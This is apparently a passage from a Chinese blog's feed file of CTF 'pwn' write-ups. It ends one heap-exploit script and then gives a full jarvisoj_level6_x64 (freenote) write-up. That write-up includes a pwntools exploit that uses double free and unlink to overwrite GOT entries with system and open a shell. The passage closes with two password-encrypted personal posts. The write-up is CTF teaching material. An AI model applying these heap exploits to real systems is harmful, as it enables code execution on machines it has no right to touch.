class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#1 The original position of 2</span></span><br><span class="line">allo(<span class="number">0x10</span>)<span class="comment">#2 4 Simultaneous pointing</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">content = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(content))</span><br><span class="line">libc_base = (content) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(libc_base + <span class="number">0x3C4AED</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">0x2</span>+<span class="number">0x8</span>+<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">79</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><p><a href="https://blog.csdn.net/qq_43935969/article/details/115877748">https://blog.csdn.net/qq_43935969/article/details/115877748</a></p><p><a href="https://www.cnblogs.com/Rookle/p/12901747.html">https://www.cnblogs.com/Rookle/p/12901747.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>jarvisoj_level6_x64</title>
      <link href="/2022/01/13/jarvisoj_level6_x64/"/>
      <url>/2022/01/13/jarvisoj_level6_x64/</url>
      
        <content type="html"><![CDATA[<p>double free，unlink覆写got表</p><span id="more"></span><h3 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h3><p>主函数：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201121227754.png" alt="image-20220112122741514"></p><p>之后</p><p>sub_400A49：用户初始堆分配</p><p>sub_400998：要求输入一个操作选项</p><p>sub_400B14：遍历索引打印所有标号和记录内容</p><p>sub_400BC2:  要求输入记录的内容长度和记录内容，然后检测输入长度是否超过最大值，正常则malloc一个堆块用来存储记录，然后按输入的长度读取记录内容到堆块：</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132322174.png" alt="image-20220113232257966"></p><p>sub_400D87：编辑，是一个realloc，可以泄露堆溢出</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132329164.png" alt="image-20220113232933077"></p><p>堆v2也就是size进行了要求，在最后的sub_40085D函数中进行了内容读取，这里没有将字符串结束符读进来因此可以进行内存泄露，泄露偏移和system地址。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132339024.png" alt="image-20220113233902963"></p><p>sub_400f7d：删除功能，依据标号找到相应的记录然后重置索引表为未使用态并free掉堆块，存在double free漏洞</p><blockquote><p>unlink思路</p><ul><li>利用<code>unsorted bin</code>的<code>fd</code>指针分别泄露出<code>heap</code>地址和<code>libc</code>地址，这样就得到了最初那个<code>0x1820</code>大小的<code>chunk</code>的地址</li><li>利用<code>realloc</code>功能来构造<code>unlink</code>条件，结合<code>uaf</code>漏洞，修改某个<code>ptr</code>为<code>ptr - 0x18</code>，这个<code>ptr</code>在<code>0x1820</code>堆块上</li><li>利用<code>edit</code>修改<code>atoi@got</code>为<code>system</code>地址</li><li>输入<code>/bin/sh</code>拿<code>shell</code></li></ul></blockquote><h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>添加四个Note，释放note[0]和note[2]，此时note[0]的bk指向note[2]的chunk，note[2]的bk指向main_arena+0x58（两个chunk都进入unsorted bin）<br>再次添加2个note，payload长度为8，注意结尾不要是\x00<br>利用list泄露NOTE管理块的地址和libc基地址<br>将四个note全部删除<br>添加一个note，长度要能包含进最开始的3个note的chunk<br>伪造一个chunk，大小为0x80，fd为note[0]-0x18， bk为note[0]-0x10，利用unlink把NOTE管理块中note[0]的地址改为note[0]-0x18<br>把note[0]改为atoi的got，然后编辑note[0]，改为system地址<br>输入/bin/sh，获取shell</p><p>先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;<br>在heap基地址偏移0x30的地方有我们需要的NOTE管理块的地址</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132325326.png" alt="image-20220113232517240"></p><h3 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./freenote_x64&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;node4.buuoj.cn&#x27;,28735)</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./freenote_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">List</span>():</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">cont</span>):</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Length of new note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(cont)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter your note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(cont)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">num,cont</span>):</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note number: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Length of note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(cont)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter your note: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(cont)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">num</span>):</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note number: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;d&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;11111111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&#x27;22222222&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">List</span>()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;11111111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s=p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chunk2=u64(s[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">heap_addr=chunk2-<span class="number">0x1940</span></span><br><span class="line"></span><br><span class="line">point_chunk0=heap_addr+<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x90</span>)+p64(<span class="number">0x81</span>)+p64(point_chunk0-<span class="number">0x18</span>)+p64(point_chunk0-<span class="number">0x10</span>) </span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&#x27;c&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x121</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#free_got-&gt;system</span></span><br><span class="line"></span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_got_addr)</span><br><span class="line"></span><br><span class="line">payload2=p64(<span class="number">4</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(free_got_addr)</span><br><span class="line"></span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(chunk2)</span><br><span class="line"></span><br><span class="line">payload2+=p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(e.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload2+=<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x120</span>-<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice: Invalid!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">List</span>()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;2. &#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_in_server=u64(p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">system_in_server=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+atoi_in_server-libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3=p64(system_in_server)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202201132341535.png" alt="image-20220113234153456"></p><h3 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h3><p><a href="https://blog.csdn.net/weixin_45427676/article/details/105495608">https://blog.csdn.net/weixin_45427676/article/details/105495608</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/14869403.html">https://www.cnblogs.com/LynneHuan/p/14869403.html</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>To kk</title>
      <link href="/2022/01/02/To%20kk/"/>
      <url>/2022/01/02/To%20kk/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry incorrect password" data-whm="抱歉，信息无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="56e248d281a21f95bee6fa24b5b2ed3be9180ac56b37ab9e7e46751c7565d1ee">a6d9ea9da8fc05ccc8d1164b3233fcb96eadc174fe335a7406937ef7072c444d697324cba0e37b9b8446977dff318bb0db8606b3edf6b8d0daa86a2631e54543dbf7440acc018a572a5805e41c0a5aec4e9024ae5c9494b297378fd0133293fec6f8fc387b255223def0e791912688c260471b0946570bb6f261b14a00b094e5ea0523ef7c4b049ef6652ec40e5e53704f686bd661b3be8c7a2c43f4af3529538c4153b572e711ee1f2ce0217686708711bb3fea2deada3982089c6833593893cd51b4b88742924ef01aaacdb0fb5d2c75cace0713e615cae48331d4a1a47ec0081c6de2b4e1921fee686690e17a46abb6d5adde65fa21d0d2c36f066c29d0742cc1c2e03065d46fffd0339bcfe98bee42e123309c8c5a1bafdd1d2afbaf27f24cf7b265f0a48ba21a73986fd547205fee678555f0418a3e8b13612aeb9a558ff060a6846f74572e9fece580ea4787038abd6199eb609ccb6ab52c46bc928346e2e4387b84038ad88a7e7eb3c7e0abcf9590627c22df64a62f8fcc085c34f7c80cacbce53331ad33c8fbc08a8bf4fd75c0e02029e1b41ea799d9bc973590cd04b3d0879c6cb8d5c0e7a82b206fdd2bc2f69d91026065a5e9ecdc3d6a055996bc7a57899fb7063da7ec21906825e13064fc2f07368ed6696bc8074a1f2d07dd6ae2a2380880cbc96edb37fde089388a5b424f99ec10facf526311998a0f6525b02e4e003f5b6ce9912a14a4eaf66c77717c02e382edf3137a6aaf5afdfcdc9e42d074996f1d61c3b65c574a6c96b2256387ccacd237c16cc38a0cc150cdba7df33ff81424671dceb4968712412f409c4b8709f5f47be0c5d19296b4b36e2dbb9da02579b81eb7847e76e288e2b42a9010185bb15b1e4cbc773592fc31db3f3edeb3db16588558b49f1c857f0d42a2b02f582fc1ab2a66f455d2d4bc2f382df082c2818a81933c62786b3a65420b2fa43424db868a7992ec09fb439a5fd1b7ab44c278b48d8f4386dba71e0e0bf6bafdb804f5e190d8a147b094aee9eb460429d18df175cfd3edec4dcc51d1cbc562e2b1ff879866363f25b8e1b992eb66df62c10fb6eb64b33cf63a0bca450b1153f919a2d19bf8a798bbcebf94fd67f7cc2b083d778a2233dcf1769c40d881e6441e921c1107b192738a1498dddedef7a315b457e8906235d23e3fd89d239aee20f8f061f2b174dbd02e31ff3e090ea9896b0e3ff2302b535e74b1119099f0c52d7a60c6da30a1f959001a9d1cbec5ef5b51b1b6c3b303070ba3351ec179507479b87040445dda00195994497b0b62272cac0b4caceb371a1c18164f6db1c7bcc249bb8816b35377671d15a641c8a5230d8a7a212d494b11ded39816b38f30e6264815c5a03970867597fb2950d0f0c4d97d95c72c0cdcda64ac8d3099d5d80f7a0ef7af52d32198db256ad6947b9788dba5274baea5b0f9eb96e4edcca63b1d8b0864fa075130f7f8b988b35b3059b7841f0441ba12e96a2ee233ac1dc8fe77c512601c46e6aa47051f7e3c350fcd46d49a5780048c289ca0a8166945ffd28f749caf2b0d6c222f42e0a61d9444a275c90a144b468c7df8453d3ddb43d7bde971ad9d8d44d7d61194f478a099fa79455a6d9dcd354f243b4c1ee3229b6a3e80c150356bdee7b8f576227c7b00307e16d72ab9c6c1ca1642d8edc839f0227c583d70829378a42de0f0f4938a552878899561d946c834dec641e2e380c64f01d5da898aebf31d0ecba0944b934659605926f66cc506f2060819f1e2c3a0079026e77301084d1c4572f6d6249dfd6eb83efc90bdc09fa5575032bdf434b87e7863bc12dc0358068fd5abedac684b2d4db9e8f28e3f5e858e698e04388499101f6eeab96ef62f95a2e48c60e0c5f07043059b3b0c595f91242a3bacb650bf5ea384dd19a6272d6e811e92146bd29723e20987be93aaefecdc2543afb673578dd969c120932f5768d14ebb8105cc2a977039ec5cdfcd573a182d7e25e8707a58566e2de175301e4de60e77039c82457cc3a57c973ae7098babb023d8638b0ec81a78aa925b82280824f5a48afec35b5a87ecd91c1645ef7eba5056bf64774cc255b5e55632f95314e6ee549c5b0f69f65f04492a47f110dbfcb7c7e03e8abb255367b9b0964bb333732292e0ad92880194e7a5271f6a1833611137453ae5e08c2366fccdf731a72c494a430e59eb02375877538381f9381dcb229d2f98c994278dc8c4dd210e1035db105f965de586ebb3646f064d3d47c354ef0f005fe85678f92dd1404a4c881ef8308eb0216da32c7239434ff6b6f230377b2a20a7d014a8b0a2dbd35c1292356e624ea93f213ab0a245bcc89c5123fba71f32f32ae4406005a720d62190a342debd5b065ee26c98875ad59a9edca578102dbbb4d0b94c241574f6d34d432e588c3275ef5069e093f8253c3e85d9b3ba7b1a1e98b6024e1570a407e0c0f59b90f89efeab6333295fc000eb8683ad7f2749f51f14467953e32199eac5438868ecad43c90ebf6950258d3fa87d8170ee763322484800966abbe3215e0c65e250d9083314b352804afc1e55c94cf602a64bd4e6026cd0deb595396eeba327f2dd999d54389c979c81c936fc026226b96e734191a755bf66e34c13dea5113d89630d45fadf7326162604d4ce8e6d8a5c2589dfa919318ac37ec298913ac95f1a7061c74a2233f98249d687a3ee6d0848131044c23ebcba30bf34b77d7a32378125d736c56a80d0c273c84faac71a4c4355617c3d991f50de3d54f0ae1cad27b6693d14f11b9906f74c7de738c6fe20d529a13471ccb3274f3d9168fa9c984630db20b631b0404b7b08ce9fd20206a38f313b499846ea436818e59afad01ec9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Pease input your password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Diaries</title>
      <link href="/2021/12/26/diary/"/>
      <url>/2021/12/26/diary/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry incorrect password" data-whm="抱歉，信息无法验证">  <script id="hbeData" type="hbeData" data-hmacdigest="a8390783ed409043bed0436e4d295a70eda5ee7191633113770227acbfa57c33">b6564b1d950e205446a5f2eabbefe8866c8c0c9144c3793e12be10a85944a02b9e5597b8013830aeb659dc6944f615e50212eca39800024b8915041b82abcbb1f909949a21ee7f948380a304a6a59254655a595662ef8de7c696c909b711d997e9eb675e8bea7c522698a91b595b6de3b69dcbba419572cc25b2185a4a82cce8bd2f6db3f7409fc95b7c5a9b3ba1ac7116919da19415da61d6b781aa18086d93dfeed04c4f81b9a2e2ee533e9db825675e10d1531160f7b3158e2e79b3c56ea069083c7c572d4e9e90fbbbd6b6755f7a70e691765c6234e8b30663740995bd9a157bdfd0047e76514ac4f89c7f453194a05a814b282265c9302fc51857f995e4010fae468aedf59cf8d02a50a16638422d7b29eb2774e6b44d3786131dd08f80185b89115c8f44850a75ce5852bcedad8957a1b0793c7e6339de5ee40130b024c91b4ce5b68fde1b79cb8130e8d1546c390bb72ab668236d7007c08912f687c1994a241a60dfa7e5c0c5477559644feb390cef5eb0fb5383caf8b13993502d3d9ce2380d2e346822ff931a3375e72cd568571c387f9762a664ea90900627b038861a1383ed19a29901ad10ae05429ba1e3627bb7ce1d0c993888c4bfb3d12c4bc4d91d3d2da3497f01319094c52d7e17036e025eaf1732e5ba714264ad7454291112b70483a4ba9aaecbc3a47da7d0be3b1f9fd0d18ada0122056aa443c24bf1a5a73d4a23b65a12e607e794c52b775aefb9b6210860e724999715a479b1fb524287d60ef43c1db037f5540d5db1e5fcadeee3ce77964efc9a24cdaf6281eb0004f1db42d5012582719bc20bd20e3a3119cda0e445ff9aa3497882ec0b54d10fdbba87ceb18e9121cde5e0204d21f22b4182bded3784849045161f045a7d3e29d9725e255c8aef501bfca97e461340ae17e09b9a72e3a52701486034861ce509e0d60028276f3b9efbcb9d9cd7872a0f4a6dd320123df8e71bef1436b01bdb843df2f21bc550b2ed8f1109bba2f13c0ee1072f984bf26d3976b1b26fe64801b3355e70a87059b0ee8facd989bcacd7c5fb83e4c88de349dfb664a058440f79e4fab1391efcdcc6312652d7ef3564bcbfd5120eeadbe25d5d35b33167464b2b13a7e9710cfd2d5e5855e37757ab2f664baec6268095abc67e22959e427479dc2c211fb65fc272afa03f0322759dfe52473ae9e6f869d015d1c029ab6fb3173e7b8cac34208c99ef4d3f51031bd48824cfda64bb4ef3d609c4cff7b8188fb69d505483f333e294ff22d532b587daa82e1e459b856cec1c29c8e138f1513993b3905406a5a6294141b755d401b97800f9ed9f0d965c382c900f5781308caf782bb3fca3b656e35e9b8640a9f2e333d25fa705d80cc95eb08cf15f557a5ba057d9a792ba3fb5f0408c273a56363dce042808398ec243da0020f293b2fedcdbcbd31a3f10b5a07d49e049e2eaa043a4232ab1fb86b19784cba2cb9f6d43a3ffd4b9ac58ede0aba3739885cb991f18719daed98bf240e2fa7a8e4406202a933842ab015de8b56c08aea1fe2f3bb8bf8be7fed795b6523bf7f68bac9f0bc81c67683a837f82c5eb599d8c0d6ee09dbf452fd4463cf090537a9a27037c5f0885f5621731c9f10617edd82f73cac28bc86a488559f37ea6d309f552c725851ad3a8018f92512e01aa25730c55a5f3e4bd6dc304a1471a8dd5bada58114dc28dc8788a75881f924e60fde96f56a391e04da341e774dc44442cefd4095c87a9d1a7cec92b023a06d70092a1ee0c7e0fa5adcd4f99fb609d7269e70f38a38b77cec17d0f95f35f0ef480d66046cec5779e57ebcc6d8f84170e4f9e904526c77a20cb964298534f97c85e4ea3590fd5f1d9163a01f318b419acd85d99ec2621bbd7d677773dea589d07813afdd2b2c34a7ec3ff61afab3c7f801369b3bf6ec90a1a5e5b2d3e8da02eebd2608052cc33f66ad223189d46c188fdce88038c526e9bb9dcb69c49ceec8d52ce9de4024f3974e85b618f85fba93b7a1b9f1d6a70e8370a7bb58dad93332a95132bc75705c79b532999c80b394626b905369069da7c6b84cf223108c5ed064d4e4eadf932896211de63e59c415d2420b11bfaa9f52a6ca443f75cab784304085b7287578a3e6cac1665e536962e50bb8b60431c0b55a6ed21fc8bd28af8f93809da8f5a9a66afd96e6f4938b853608e7556cda175b016fe84807d9d784432f0892a1adf49cfcc77f5e791bf0e36ddb3d617089232f5b05ae3dfbd3ff588550946b2ea5e68ba6fbeac953909423df405b4ddcd500268c5d375b20f93bd52eda68fed439160a4da74ed6f62642e8c561b794b96e2564945968b1a7407575f17cd000baf39920122d4de6f7db44d1b43adc9bab8ce4fbf76ee062503e2a5ab3f163f37cb14ca663d00b165155036698ccf3ecf0f77982028aed4a325e11944b53616d8bebc454e15bfb268528164eef976ba761e03e86d8f